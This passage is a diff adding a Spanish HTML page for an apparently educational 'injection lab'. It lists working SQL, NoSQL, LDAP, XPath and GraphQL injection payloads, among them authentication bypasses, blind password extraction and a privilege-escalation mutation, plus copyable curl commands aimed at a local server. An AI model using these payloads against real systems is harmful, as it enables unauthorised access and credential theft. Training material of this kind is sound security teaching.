@@ -1,0 +1,1008 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Laboratorio de Inyecciones — Ciberseguridad Educativa">
+    <title>Laboratorio de Inyecciones</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="injections.css">
+</head>
+
+<body>
+    <div class="bg-particles" id="particles"></div>
+
+    <!-- ── Barra de navegación superior ─────────────────────────────── -->
+    <nav class="injection-nav" id="injectionNav">
+        <div class="nav-brand">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"
+                stroke-linejoin="round" width="22" height="22">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+            </svg>
+            <span>Laboratorio de Inyecciones</span>
+        </div>
+        <div class="nav-tabs">
+            <button class="nav-tab active" data-tab="sql" id="tabSQL">
+                <span class="tab-icon">🗄️</span>
+                <span class="tab-label">SQL</span>
+            </button>
+            <button class="nav-tab" data-tab="nosql" id="tabNoSQL">
+                <span class="tab-icon">🍃</span>
+                <span class="tab-label">NoSQL</span>
+            </button>
+            <button class="nav-tab" data-tab="ldap" id="tabLDAP">
+                <span class="tab-icon">📁</span>
+                <span class="tab-label">LDAP</span>
+            </button>
+            <button class="nav-tab" data-tab="xpath" id="tabXPath">
+                <span class="tab-icon">📄</span>
+                <span class="tab-label">XPath</span>
+            </button>
+            <button class="nav-tab" data-tab="graphql" id="tabGraphQL">
+                <span class="tab-icon">◈</span>
+                <span class="tab-label">GraphQL</span>
+            </button>
+        </div>
+        <a href="/" class="nav-home-btn" title="Volver al login">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                stroke-linejoin="round" width="18" height="18">
+                <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" />
+                <polyline points="9 22 9 12 15 12 15 22" />
+            </svg>
+        </a>
+    </nav>
+
+    <!-- ── Contenido principal ──────────────────────────────────────── -->
+    <main class="lab-container">
+
+        <!-- ════════════════════════════════════════════════════════════ -->
+        <!-- SQL INJECTION                                               -->
+        <!-- ════════════════════════════════════════════════════════════ -->
+        <section class="injection-panel active" id="panelSQL">
+            <div class="panel-card">
+                <div class="panel-header">
+                    <div class="panel-icon sql-icon">🗄️</div>
+                    <div>
+                        <h1>Inyección SQL</h1>
+                        <p class="panel-subtitle">Manipulación de consultas SQL mediante entrada no sanitizada</p>
+                    </div>
+                </div>
+
+                <div class="panel-body">
+                    <div class="info-banner danger">
+                        <span class="banner-icon">⚠️</span>
+                        <div>
+                            <strong>Vulnerabilidad:</strong> La consulta usa concatenación directa de strings en lugar
+                            de prepared statements, permitiendo alterar la lógica SQL.
+                        </div>
+                    </div>
+
+                    <form id="sqlForm" class="injection-form" autocomplete="off">
+                        <div class="input-group">
+                            <label for="sqlUsuario">Usuario</label>
+                            <div class="input-wrapper">
+                                <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                    stroke-width="1.5">
+                                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
+                                    <circle cx="12" cy="7" r="4" />
+                                </svg>
+                                <input type="text" id="sqlUsuario" name="usuario"
+                                    placeholder="Ingresa usuario o payload SQL">
+                            </div>
+                        </div>
+                        <div class="input-group">
+                            <label for="sqlContrasena">Contraseña</label>
+                            <div class="input-wrapper">
+                                <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                    stroke-width="1.5">
+                                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
+                                    <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+                                </svg>
+                                <input type="text" id="sqlContrasena" name="contrasena"
+                                    placeholder="Ingresa contraseña o payload">
+                            </div>
+                        </div>
+                        <div class="message-container" id="sqlMessage"></div>
+                        <button type="submit" class="btn-inject btn-sql">
+                            <span class="btn-text">🚀 Ejecutar Inyección SQL</span>
+                            <div class="btn-loader" style="display:none">
+                                <div class="spinner"></div>
+                            </div>
+                        </button>
+                    </form>
+
+                    <!-- Consulta generada -->
+                    <div class="query-display" id="sqlQueryDisplay" style="display:none">
+                        <div class="query-label">Consulta SQL generada:</div>
+                        <pre class="query-code" id="sqlQueryCode"></pre>
+                    </div>
+                </div>
+
+                <!-- Payloads de ejemplo -->
+                <div class="payloads-section">
+                    <div class="section-divider"><span>Payloads de ejemplo</span></div>
+                    <div class="payload-grid">
+                        <div class="payload-card" data-target="sqlUsuario" data-payload="' OR '1'='1' --">
+                            <div class="payload-title">Bypass de autenticación</div>
+                            <code class="payload-code">' OR '1'='1' --</code>
+                            <p class="payload-desc">Salta la autenticación completamente al hacer la condición siempre
+                                verdadera.</p>
+                        </div>
+                        <div class="payload-card" data-target="sqlUsuario" data-payload="administrador' --">
+                            <div class="payload-title">Login como admin</div>
+                            <code class="payload-code">administrador' --</code>
+                            <p class="payload-desc">Entra como administrador sin saber la contraseña (el -- comenta el
+                                resto).</p>
+                        </div>
+                        <div class="payload-card" data-target="sqlUsuario" data-payload="' OR 1=1 --">
+                            <div class="payload-title">Primer usuario</div>
+                            <code class="payload-code">' OR 1=1 --</code>
+                            <p class="payload-desc">Devuelve el primer usuario de la tabla de usuarios.</p>
+                        </div>
+                        <div class="payload-card" data-target="sqlUsuario"
+                            data-payload="' UNION SELECT 1, 'hacked', 'pass' --">
+                            <div class="payload-title">UNION SELECT</div>
+                            <code class="payload-code">' UNION SELECT 1, 'hacked', 'pass' --</code>
+                            <p class="payload-desc">Inyecta un usuario ficticio usando UNION para combinar resultados.
+                            </p>
+                        </div>
+                        <div class="payload-card" data-target="sqlUsuario" data-payload="' OR '1'='1' LIMIT 1 --">
+                            <div class="payload-title">Con LIMIT</div>
+                            <code class="payload-code">' OR '1'='1' LIMIT 1 --</code>
+                            <p class="payload-desc">Obtiene solo el primer registro, evitando errores con múltiples
+                                resultados.</p>
+                        </div>
+                        <div class="payload-card" data-target="sqlContrasena" data-payload="' OR '1'='1">
+                            <div class="payload-title">En campo contraseña</div>
+                            <code class="payload-code">' OR '1'='1</code>
+                            <p class="payload-desc">Inyección en el campo de contraseña en vez de usuario.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ════════════════════════════════════════════════════════════ -->
+        <!-- NoSQL INJECTION                                             -->
+        <!-- ════════════════════════════════════════════════════════════ -->
+        <section class="injection-panel" id="panelNoSQL">
+            <div class="panel-card">
+                <div class="panel-header">
+                    <div class="panel-icon nosql-icon">🍃</div>
+                    <div>
+                        <h1>Inyección NoSQL</h1>
+                        <p class="panel-subtitle">Manipulación de consultas MongoDB mediante operadores JSON</p>
+                    </div>
+                </div>
+
+                <div class="panel-body">
+                    <div class="info-banner warning">
+                        <span class="banner-icon">⚠️</span>
+                        <div>
+                            <strong>Vulnerabilidad:</strong> El servidor acepta objetos JSON directamente en la consulta
+                            MongoDB sin validar el tipo de dato, permitiendo operadores como <code>$gt</code>,
+                            <code>$ne</code>, <code>$regex</code>.
+                        </div>
+                    </div>
+
+                    <form id="nosqlForm" class="injection-form" autocomplete="off">
+                        <div class="input-group">
+                            <label for="nosqlUsuario">Usuario (string o JSON)</label>
+                            <div class="input-wrapper">
+                                <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                    stroke-width="1.5">
+                                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
+                                    <circle cx="12" cy="7" r="4" />
+                                </svg>
+                                <input type="text" id="nosqlUsuario" name="usuario" placeholder='admin o {"$ne": ""}'>
+                            </div>
+                        </div>
+                        <div class="input-group">
+                            <label for="nosqlContrasena">Contraseña (string o JSON)</label>
+                            <div class="input-wrapper">
+                                <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                    stroke-width="1.5">
+                                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
+                                    <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+                                </svg>
+                                <input type="text" id="nosqlContrasena" name="contrasena"
+                                    placeholder='password o {"$gt": ""}'>
+                            </div>
+                        </div>
+                        <div class="message-container" id="nosqlMessage"></div>
+                        <button type="submit" class="btn-inject btn-nosql">
+                            <span class="btn-text">🍃 Ejecutar Inyección NoSQL</span>
+                            <div class="btn-loader" style="display:none">
+                                <div class="spinner"></div>
+                            </div>
+                        </button>
+                    </form>
+
+                    <div class="query-display" id="nosqlQueryDisplay" style="display:none">
+                        <div class="query-label">Consulta MongoDB generada:</div>
+                        <pre class="query-code" id="nosqlQueryCode"></pre>
+                    </div>
+                </div>
+
+                <div class="payloads-section">
+                    <div class="section-divider"><span>Payloads de ejemplo</span></div>
+                    <div class="payload-grid">
+                        <div class="payload-card" data-target="nosqlUsuario" data-payload='{"$ne": ""}'
+                            data-target2="nosqlContrasena" data-payload2='{"$ne": ""}'>
+                            <div class="payload-title">$ne (not equal) bypass</div>
+                            <code class="payload-code">usuario: {"$ne": ""}<br>contraseña: {"$ne": ""}</code>
+                            <p class="payload-desc">Busca donde usuario y contraseña NO sean vacíos — devuelve el primer
+                                documento.</p>
+                        </div>
+                        <div class="payload-card" data-target="nosqlUsuario" data-payload='{"$gt": ""}'
+                            data-target2="nosqlContrasena" data-payload2='{"$gt": ""}'>
+                            <div class="payload-title">$gt (greater than) bypass</div>
+                            <code class="payload-code">usuario: {"$gt": ""}<br>contraseña: {"$gt": ""}</code>
+                            <p class="payload-desc">Encuentra documentos donde los campos sean mayores que una cadena
+                                vacía.</p>
+                        </div>
+                        <div class="payload-card" data-target="nosqlUsuario" data-payload='{"$regex": ".*"}'
+                            data-target2="nosqlContrasena" data-payload2='{"$regex": ".*"}'>
+                            <div class="payload-title">$regex wildcard</div>
+                            <code class="payload-code">usuario: {"$regex": ".*"}<br>contraseña: {"$regex": ".*"}</code>
+                            <p class="payload-desc">Usa expresión regular que coincide con cualquier cadena.</p>
+                        </div>
+                        <div class="payload-card" data-target="nosqlUsuario" data-payload="admin"
+                            data-target2="nosqlContrasena" data-payload2='{"$regex": "^p"}'>
+                            <div class="payload-title">Enumeración con $regex</div>
+                            <code class="payload-code">usuario: admin<br>contraseña: {"$regex": "^p"}</code>
+                            <p class="payload-desc">Descubre contraseñas carácter por carácter usando regex parciales.
+                            </p>
+                        </div>
+                        <div class="payload-card" data-target="nosqlUsuario"
+                            data-payload='{"$in": ["admin", "administrador", "root"]}' data-target2="nosqlContrasena"
+                            data-payload2='{"$ne": "x"}'>
+                            <div class="payload-title">$in — múltiples usuarios</div>
+                            <code
+                                class="payload-code">usuario: {"$in": ["admin",...]}<br>contraseña: {"$ne": "x"}</code>
+                            <p class="payload-desc">Intenta múltiples nombres de usuario en una sola consulta.</p>
+                        </div>
+                        <div class="payload-card" data-target="nosqlUsuario" data-payload='{"$where": "1==1"}'
+                            data-target2="nosqlContrasena" data-payload2="cualquiera">
+                            <div class="payload-title">$where con JavaScript</div>
+                            <code class="payload-code">usuario: {"$where": "1==1"}</code>
+                            <p class="payload-desc">Ejecuta código JS arbitrario en el servidor MongoDB (muy peligroso).
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Comandos curl -->
+                <div class="commands-section">
+                    <div class="section-divider"><span>Comandos curl para ejecutar</span></div>
+                    <div class="command-block">
+                        <div class="command-header">
+                            <span>Bypass con $ne</span>
+                            <button class="copy-btn"
+                                data-copy='curl -X POST http://localhost:3001/nosql-login -H "Content-Type: application/json" -d &apos;{"usuario":{"$ne":""},"contrasena":{"$ne":""}}&apos;'>📋
+                                Copiar</button>
+                        </div>
+                        <pre class="command-code">curl -X POST http://localhost:3001/nosql-login \
+  -H "Content-Type: application/json" \
+  -d '{"usuario":{"$ne":""},"contrasena":{"$ne":""}}'</pre>
+                    </div>
+                    <div class="command-block">
+                        <div class="command-header">
+                            <span>Bypass con $gt</span>
+                            <button class="copy-btn"
+                                data-copy='curl -X POST http://localhost:3001/nosql-login -H "Content-Type: application/json" -d &apos;{"usuario":{"$gt":""},"contrasena":{"$gt":""}}&apos;'>📋
+                                Copiar</button>
+                        </div>
+                        <pre class="command-code">curl -X POST http://localhost:3001/nosql-login \
+  -H "Content-Type: application/json" \
+  -d '{"usuario":{"$gt":""},"contrasena":{"$gt":""}}'</pre>
+                    </div>
+                    <div class="command-block">
+                        <div class="command-header">
+                            <span>Enumeración con $regex</span>
+                            <button class="copy-btn"
+                                data-copy='curl -X POST http://localhost:3001/nosql-login -H "Content-Type: application/json" -d &apos;{"usuario":"admin","contrasena":{"$regex":"^p"}}&apos;'>📋
+                                Copiar</button>
+                        </div>
+                        <pre class="command-code">curl -X POST http://localhost:3001/nosql-login \
+  -H "Content-Type: application/json" \
+  -d '{"usuario":"admin","contrasena":{"$regex":"^p"}}'</pre>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ════════════════════════════════════════════════════════════ -->
+        <!-- LDAP INJECTION                                              -->
+        <!-- ════════════════════════════════════════════════════════════ -->
+        <section class="injection-panel" id="panelLDAP">
+            <div class="panel-card">
+                <div class="panel-header">
+                    <div class="panel-icon ldap-icon">📁</div>
+                    <div>
+                        <h1>Inyección LDAP</h1>
+                        <p class="panel-subtitle">Manipulación de filtros LDAP para acceder a directorios sin
+                            autorización</p>
+                    </div>
+                </div>
+
+                <div class="panel-body">
+                    <div class="info-banner info">
+                        <span class="banner-icon">ℹ️</span>
+                        <div>
+                            <strong>Vulnerabilidad:</strong> El filtro LDAP se construye concatenando la entrada del
+                            usuario directamente:
+                            <code>(&(uid={usuario})(userPassword={contraseña}))</code>. La falta de sanitización permite
+                            inyectar operadores LDAP.
+                        </div>
+                    </div>
+
+                    <form id="ldapForm" class="injection-form" autocomplete="off">
+                        <div class="input-group">
+                            <label for="ldapUsuario">Usuario (uid)</label>
+                            <div class="input-wrapper">
+                                <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                    stroke-width="1.5">
+                                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
+                                    <circle cx="12" cy="7" r="4" />
+                                </svg>
+                                <input type="text" id="ldapUsuario" name="usuario" placeholder="uid o payload LDAP">
+                            </div>
+                        </div>
+                        <div class="input-group">
+                            <label for="ldapContrasena">Contraseña (userPassword)</label>
+                            <div class="input-wrapper">
+                                <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                    stroke-width="1.5">
+                                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
+                                    <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+                                </svg>
+                                <input type="text" id="ldapContrasena" name="contrasena"
+                                    placeholder="Contraseña o payload LDAP">
+                            </div>
+                        </div>
+                        <div class="message-container" id="ldapMessage"></div>
+                        <button type="submit" class="btn-inject btn-ldap">
+                            <span class="btn-text">📁 Ejecutar Inyección LDAP</span>
+                            <div class="btn-loader" style="display:none">
+                                <div class="spinner"></div>
+                            </div>
+                        </button>
+                    </form>
+
+                    <div class="query-display" id="ldapQueryDisplay" style="display:none">
+                        <div class="query-label">Filtro LDAP generado:</div>
+                        <pre class="query-code" id="ldapQueryCode"></pre>
+                    </div>
+                </div>
+
+                <div class="payloads-section">
+                    <div class="section-divider"><span>Payloads de ejemplo</span></div>
+                    <div class="payload-grid">
+                        <div class="payload-card" data-target="ldapUsuario" data-payload="*">
+                            <div class="payload-title">Wildcard básico</div>
+                            <code class="payload-code">*</code>
+                            <p class="payload-desc">El asterisco coincide con cualquier valor en LDAP → devuelve el
+                                primer usuario.</p>
+                        </div>
+                        <div class="payload-card" data-target="ldapUsuario" data-payload="admin)(|(uid=*">
+                            <div class="payload-title">Bypass con OR lógico</div>
+                            <code class="payload-code">admin)(|(uid=*</code>
+                            <p class="payload-desc">Cierra el filtro original e inyecta un OR que coincide con todos los
+                                usuarios.</p>
+                        </div>
+                        <div class="payload-card" data-target="ldapUsuario" data-payload="*)(uid=*))(|(uid=*">
+                            <div class="payload-title">Doble inyección</div>
+                            <code class="payload-code">*)(uid=*))(|(uid=*</code>
+                            <p class="payload-desc">Inyección más agresiva que fuerza múltiples filtros verdaderos.</p>
+                        </div>
+                        <div class="payload-card" data-target="ldapUsuario" data-payload="admin)(&))"
+                            data-target2="ldapContrasena" data-payload2="cualquiera">
+                            <div class="payload-title">Null LDAP filter</div>
+                            <code class="payload-code">admin)(&))</code>
+                            <p class="payload-desc">Inyecta un filtro AND vacío que se evalúa como TRUE en algunas
+                                implementaciones.</p>
+                        </div>
+                        <div class="payload-card" data-target="ldapUsuario" data-payload="admin)(|(password=*">
+                            <div class="payload-title">Extracción de passwords</div>
+                            <code class="payload-code">admin)(|(password=*</code>
+                            <p class="payload-desc">Intenta manipular el filtro para que devuelva la contraseña.</p>
+                        </div>
+                        <div class="payload-card" data-target="ldapContrasena" data-payload="*)(uid=admin">
+                            <div class="payload-title">Inyección en contraseña</div>
+                            <code class="payload-code">*)(uid=admin</code>
+                            <p class="payload-desc">Inyecta en el campo contraseña para forzar búsqueda por uid=admin.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="commands-section">
+                    <div class="section-divider"><span>Comandos curl para ejecutar</span></div>
+                    <div class="command-block">
+                        <div class="command-header">
+                            <span>Wildcard bypass</span>
+                            <button class="copy-btn"
+                                data-copy='curl -X POST http://localhost:3001/ldap-login -H "Content-Type: application/json" -d &apos;{"usuario":"*","contrasena":"*"}&apos;'>📋
+                                Copiar</button>
+                        </div>
+                        <pre class="command-code">curl -X POST http://localhost:3001/ldap-login \
+  -H "Content-Type: application/json" \
+  -d '{"usuario":"*","contrasena":"*"}'</pre>
+                    </div>
+                    <div class="command-block">
+                        <div class="command-header">
+                            <span>OR injection bypass</span>
+                            <button class="copy-btn"
+                                data-copy='curl -X POST http://localhost:3001/ldap-login -H "Content-Type: application/json" -d &apos;{"usuario":"admin)(|(uid=*","contrasena":"cualquiera"}&apos;'>📋
+                                Copiar</button>
+                        </div>
+                        <pre class="command-code">curl -X POST http://localhost:3001/ldap-login \
+  -H "Content-Type: application/json" \
+  -d '{"usuario":"admin)(|(uid=*","contrasena":"cualquiera"}'</pre>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ════════════════════════════════════════════════════════════ -->
+        <!-- XPath INJECTION                                             -->
+        <!-- ════════════════════════════════════════════════════════════ -->
+        <section class="injection-panel" id="panelXPath">
+            <div class="panel-card">
+                <div class="panel-header">
+                    <div class="panel-icon xpath-icon">📄</div>
+                    <div>
+                        <h1>Inyección XPath</h1>
+                        <p class="panel-subtitle">Manipulación de consultas XPath contra documentos XML</p>
+                    </div>
+                </div>
+
+                <div class="panel-body">
+                    <div class="info-banner info">
+                        <span class="banner-icon">ℹ️</span>
+                        <div>
+                            <strong>Vulnerabilidad:</strong> La consulta XPath se construye por concatenación:
+                            <code>//user[username/text()='{usuario}' and password/text()='{contraseña}']</code>. Se
+                            pueden inyectar predicados XPath.
+                        </div>
+                    </div>
+
+                    <form id="xpathForm" class="injection-form" autocomplete="off">
+                        <div class="input-group">
+                            <label for="xpathUsuario">Usuario (XPath username)</label>
+                            <div class="input-wrapper">
+                                <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                    stroke-width="1.5">
+                                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
+                                    <circle cx="12" cy="7" r="4" />
+                                </svg>
+                                <input type="text" id="xpathUsuario" name="usuario"
+                                    placeholder="Usuario o payload XPath">
+                            </div>
+                        </div>
+                        <div class="input-group">
+                            <label for="xpathContrasena">Contraseña (XPath password)</label>
+                            <div class="input-wrapper">
+                                <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                                    stroke-width="1.5">
+                                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
+                                    <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+                                </svg>
+                                <input type="text" id="xpathContrasena" name="contrasena"
+                                    placeholder="Contraseña o payload XPath">
+                            </div>
+                        </div>
+                        <div class="message-container" id="xpathMessage"></div>
+                        <button type="submit" class="btn-inject btn-xpath">
+                            <span class="btn-text">📄 Ejecutar Inyección XPath</span>
+                            <div class="btn-loader" style="display:none">
+                                <div class="spinner"></div>
+                            </div>
+                        </button>
+                    </form>
+
+                    <div class="query-display" id="xpathQueryDisplay" style="display:none">
+                        <div class="query-label">Consulta XPath generada:</div>
+                        <pre class="query-code" id="xpathQueryCode"></pre>
+                    </div>
+                </div>
+
+                <div class="payloads-section">
+                    <div class="section-divider"><span>Payloads de ejemplo</span></div>
+                    <div class="payload-grid">
+                        <div class="payload-card" data-target="xpathUsuario" data-payload="' or '1'='1"
+                            data-target2="xpathContrasena" data-payload2="' or '1'='1">
+                            <div class="payload-title">Bypass clásico OR</div>
+                            <code class="payload-code">usuario: ' or '1'='1<br>contraseña: ' or '1'='1</code>
+                            <p class="payload-desc">Hace que ambas condiciones sean verdaderas, devolviendo el primer
+                                nodo.</p>
+                        </div>
+                        <div class="payload-card" data-target="xpathUsuario" data-payload="' or 1=1 or ''='">
+                            <div class="payload-title">Triple condición OR</div>
+                            <code class="payload-code">' or 1=1 or ''='</code>
+                            <p class="payload-desc">Inyecta múltiples OR para garantizar una condición verdadera.</p>
+                        </div>
+                        <div class="payload-card" data-target="xpathUsuario" data-payload="admin' or '1'='1"
+                            data-target2="xpathContrasena" data-payload2="lo_que_sea">
+                            <div class="payload-title">Login como admin</div>
+                            <code class="payload-code">admin' or '1'='1</code>
+                            <p class="payload-desc">Fuerza la búsqueda del usuario admin haciendo la condición de
+                                contraseña irrelevante.</p>
+                        </div>
+                        <div class="payload-card" data-target="xpathUsuario"
+                            data-payload="'] | //user[username/text()='admin" data-target2="xpathContrasena"
+                            data-payload2="x">
+                            <div class="payload-title">Union XPath</div>
+                            <code class="payload-code">'] | //user[username/text()='admin</code>
+                            <p class="payload-desc">Usa el operador UNION de XPath (|) para inyectar una segunda
+                                consulta.</p>
+                        </div>
+                        <div class="payload-card" data-target="xpathUsuario"
+                            data-payload="' or string-length(//user[1]/password/text())>0 or ''='">
+                            <div class="payload-title">Blind XPath — longitud</div>
+                            <code class="payload-code">' or string-length(//user[1]/password/text())>0 or ''='</code>
+                            <p class="payload-desc">Inyección ciega para determinar si existe contenido en el campo
+                                password.</p>
+                        </div>
+                        <div class="payload-card" data-target="xpathUsuario"
+                            data-payload="' or substring(//user[1]/password/text(),1,1)='p' or ''='">
+                            <div class="payload-title">Blind XPath — caracteres</div>
+                            <code class="payload-code">' or substring(...,1,1)='p' or ''='</code>
+                            <p class="payload-desc">Extrae la contraseña carácter por carácter usando substring().</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="commands-section">
+                    <div class="section-divider"><span>Comandos curl para ejecutar</span></div>
+                    <div class="command-block">
+                        <div class="command-header">
+                            <span>Bypass con OR</span>
+                            <button class="copy-btn" data-copy="curl -X POST http://localhost:3001/xpath-login -H \"
+                                Content-Type: application/json\"
+                                -d '{\"usuario\":\"&apos; or &apos;1&apos;=&apos;1\",\"contrasena\":\"&apos; or &apos;1&apos;=&apos;1\"}'">📋 Copiar</button>
+            </div>
+            <pre class=" command-code">curl -X POST http://localhost:3001/xpath-login \
+                                -H "Content-Type: application/json" \
+                                -d '{"usuario":"'"'"' or '"'"'1'"'"'='"'"'1","contrasena":"'"'"' or
+                                '"'"'1'"'"'='"'"'1"}'</pre>
+                        </div>
+                        <div class="command-block">
+                            <div class="command-header">
+                                <span>Login como admin</span>
+                                <button class="copy-btn" data-copy="curl -X POST http://localhost:3001/xpath-login -H \"
+                                    Content-Type: application/json\"
+                                    -d '{\"usuario\":\"admin&apos; or &apos;1&apos;=&apos;1\",\"contrasena\":\"x\"}'">📋 Copiar</button>
+            </div>
+            <pre class=" command-code">curl -X POST http://localhost:3001/xpath-login \
+                                    -H "Content-Type: application/json" \
+                                    -d '{"usuario":"admin'"'"' or '"'"'1'"'"'='"'"'1","contrasena":"x"}'</pre>
+                            </div>
+                        </div>
+                    </div>
+        </section>
+
+        <!-- ════════════════════════════════════════════════════════════ -->
+        <!-- GraphQL INJECTION                                           -->
+        <!-- ════════════════════════════════════════════════════════════ -->
+        <section class="injection-panel" id="panelGraphQL">
+            <div class="panel-card">
+                <div class="panel-header">
+                    <div class="panel-icon graphql-icon">◈</div>
+                    <div>
+                        <h1>Inyección GraphQL</h1>
+                        <p class="panel-subtitle">Explotación de esquemas GraphQL con introspección y consultas
+                            maliciosas</p>
+                    </div>
+                </div>
+
+                <div class="panel-body">
+                    <div class="info-banner warning">
+                        <span class="banner-icon">⚠️</span>
+                        <div>
+                            <strong>Vulnerabilidad:</strong> El endpoint GraphQL tiene introspección habilitada, no
+                            limita profundidad de queries, y no tiene rate limiting. Esto permite enumerar todo el
+                            esquema y extraer datos.
+                        </div>
+                    </div>
+
+                    <form id="graphqlForm" class="injection-form" autocomplete="off">
+                        <div class="input-group">
+                            <label for="graphqlQuery">Consulta GraphQL</label>
+                            <textarea id="graphqlQuery" name="query" class="graphql-textarea" rows="6"
+                                placeholder='{ users { id username password role } }'></textarea>
+                        </div>
+                        <div class="message-container" id="graphqlMessage"></div>
+                        <button type="submit" class="btn-inject btn-graphql">
+                            <span class="btn-text">◈ Ejecutar Consulta GraphQL</span>
+                            <div class="btn-loader" style="display:none">
+                                <div class="spinner"></div>
+                            </div>
+                        </button>
+                    </form>
+
+                    <div class="query-display" id="graphqlQueryDisplay" style="display:none">
+                        <div class="query-label">Respuesta del servidor:</div>
+                        <pre class="query-code" id="graphqlQueryCode"></pre>
+                    </div>
+                </div>
+
+                <div class="payloads-section">
+                    <div class="section-divider"><span>Payloads de ejemplo</span></div>
+                    <div class="payload-grid">
+                        <div class="payload-card graphql-payload" data-target="graphqlQuery"
+                            data-payload='{ users { id username password role } }'>
+                            <div class="payload-title">Listar todos los usuarios</div>
+                            <code class="payload-code">{ users { id username password role } }</code>
+                            <p class="payload-desc">Accede a todos los campos incluyendo contraseñas (sin control de
+                                acceso).</p>
+                        </div>
+                        <div class="payload-card graphql-payload" data-target="graphqlQuery"
+                            data-payload='{ __schema { types { name fields { name type { name } } } } }'>
+                            <div class="payload-title">Introspección del esquema</div>
+                            <code class="payload-code">{ __schema { types { name fields { name } } } }</code>
+                            <p class="payload-desc">Revela toda la estructura del API GraphQL: tipos, campos,
+                                relaciones.</p>
+                        </div>
+                        <div class="payload-card graphql-payload" data-target="graphqlQuery"
+                            data-payload='{ __type(name: "User") { name fields { name type { name kind ofType { name } } } } }'>
+                            <div class="payload-title">Introspección tipo User</div>
+                            <code class="payload-code">{ __type(name: "User") { ... } }</code>
+                            <p class="payload-desc">Enumera todos los campos del tipo User para descubrir campos
+                                sensibles.</p>
+                        </div>
+                        <div class="payload-card graphql-payload" data-target="graphqlQuery"
+                            data-payload='{ user(id: 1) { username password role email } }'>
+                            <div class="payload-title">Acceso a usuario específico</div>
+                            <code class="payload-code">{ user(id: 1) { username password role email } }</code>
+                            <p class="payload-desc">Lee los datos de un usuario específico por ID, incluyendo datos
+                                sensibles.</p>
+                        </div>
+                        <div class="payload-card graphql-payload" data-target="graphqlQuery"
+                            data-payload='mutation { updateRole(userId: 1, role: "superadmin") { id username role } }'>
+                            <div class="payload-title">Escalada de privilegios</div>
+                            <code class="payload-code">mutation { updateRole(userId:1, role:"superadmin") }</code>
+                            <p class="payload-desc">Mutation sin autorización para cambiar el rol de un usuario a
+                                superadmin.</p>
+                        </div>
+                        <div class="payload-card graphql-payload" data-target="graphqlQuery"
+                            data-payload='{ search(query: "admin") { ... on User { id username password } ... on Config { key value } } }'>
+                            <div class="payload-title">Búsqueda con fragments</div>
+                            <code class="payload-code">{ search(query:"admin") { ...on User {...} } }</code>
+                            <p class="payload-desc">Usa inline fragments para extraer datos de múltiples tipos en una
+                                búsqueda.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="commands-section">
+                    <div class="section-divider"><span>Comandos curl para ejecutar</span></div>
+                    <div class="command-block">
+                        <div class="command-header">
+                            <span>Listar todos los usuarios</span>
+                            <button class="copy-btn"
+                                data-copy='curl -X POST http://localhost:3001/graphql -H "Content-Type: application/json" -d &apos;{"query":"{ users { id username password role } }"}&apos;'>📋
+                                Copiar</button>
+                        </div>
+                        <pre class="command-code">curl -X POST http://localhost:3001/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ users { id username password role } }"}'</pre>
+                    </div>
+                    <div class="command-block">
+                        <div class="command-header">
+                            <span>Introspección completa del esquema</span>
+                            <button class="copy-btn"
+                                data-copy='curl -X POST http://localhost:3001/graphql -H "Content-Type: application/json" -d &apos;{"query":"{ __schema { types { name fields { name type { name } } } } }"}&apos;'>📋
+                                Copiar</button>
+                        </div>
+                        <pre class="command-code">curl -X POST http://localhost:3001/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'</pre>
+                    </div>
+                    <div class="command-block">
+                        <div class="command-header">
+                            <span>Escalada de privilegios</span>
+                            <button class="copy-btn"
+                                data-copy='curl -X POST http://localhost:3001/graphql -H "Content-Type: application/json" -d &apos;{"query":"mutation { updateRole(userId: 1, role: \"superadmin\") { id username role } }"}&apos;'>📋
+                                Copiar</button>
+                        </div>
